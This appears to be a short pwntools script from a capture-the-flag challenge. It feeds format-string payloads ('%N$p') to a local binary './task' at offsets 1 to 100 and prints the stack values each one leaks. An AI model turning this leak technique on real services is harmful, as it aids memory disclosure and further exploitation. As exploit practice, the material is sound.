from pwn import *

elf = context.binary = ELF('./task')
context.log_level = 'error'

for i in range(1, 101):
    try:
        p = process()

        p.sendlineafter('First: ', "%{}$p".format(i).encode())

        resp = p.recvuntil('S').decode().strip('S')

        print(str(i) + ': ' + resp)

        p.close()

    except EOFError:
        pass
